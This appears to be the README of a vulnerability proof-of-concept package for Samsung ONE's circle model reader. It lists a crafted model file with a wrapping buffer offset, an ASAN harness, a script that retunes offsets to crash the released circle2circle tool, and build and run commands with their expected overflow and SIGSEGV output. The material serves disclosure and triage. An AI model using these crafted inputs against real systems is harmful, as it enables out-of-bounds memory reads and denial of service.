# PoC files

| File | Purpose |
|---|---|
| `poc.circle` | 224-byte crafted model. Const-tensor `Buffer` has `offset = 0xFFFFFFFFFFFFFFC0`, `size = 0x40`. |
| `benign.circle` | Control. Same layout with an in-bounds extended buffer, `offset = 4`, `size = 0x10`. |
| `harness.cpp` | Standalone ASAN harness. Builds both models with the generated `circle::` flatbuffer types, loads them with `circle::GetModel`, and runs the extended-buffer branch of `CircleConst.cpp` and `CircleReader::file_data()` as shipped. |
| `patch_buffer.py` | Rewrites the `offset` and `size` fields of a model produced by the harness, to tune the read distance. |
| `scan_circle.py` | Dependency-free triage: flags `Buffer` entries whose external `offset`/`size` point past the end of the file or wrap `uint64`. |
| `preload_trace.cpp` | `LD_PRELOAD` shim that prints the source address of the 64-byte `memcpy` relative to the model buffer. For use against the released `circle2circle`. |

## Standalone harness

```sh
git clone --depth 1 --branch v25.12.19 https://github.com/google/flatbuffers.git
curl -LO https://raw.githubusercontent.com/Samsung/ONE/1.30.1/res/CircleSchema/0.9/circle_schema.fbs
cmake -S flatbuffers -B fb-build -DFLATBUFFERS_BUILD_TESTS=OFF && cmake --build fb-build --target flatc -j
fb-build/flatc --cpp circle_schema.fbs && mv circle_schema_generated.h sch_generated.h
g++ -std=c++17 -fsanitize=address -g -DNDEBUG harness.cpp -Iflatbuffers/include -I. -o harness
./harness            # poc.circle    -> AddressSanitizer heap-buffer-overflow, READ of size 64
./harness --benign   # benign.circle -> exits 0
```

Run the binary from a mount that is not `noexec`.

## Released `circle2circle`

```sh
curl -LO https://github.com/Samsung/ONE/releases/download/1.30.1/one-compiler-noble_1.30.1_amd64.deb
sha256sum one-compiler-noble_1.30.1_amd64.deb
dpkg-deb -x one-compiler-noble_1.30.1_amd64.deb root
C2C=root/usr/share/one/bin/circle2circle

$C2C benign.circle out.circle; echo $?       # 0
$C2C poc.circle out.circle; echo $?          # 0, 64 bytes read from before the model buffer

python3 -I patch_buffer.py poc.circle dos.circle 0xFFFFFFFFF0000000 0x10000000
$C2C dos.circle out.circle; echo $?          # 139, SIGSEGV in memcpy
```

To see the unguarded read in the unmodified `poc.circle` run:

```sh
g++ -shared -fPIC -O1 -o preload_trace.so preload_trace.cpp -ldl
LD_PRELOAD=$PWD/preload_trace.so $C2C poc.circle out.circle
```
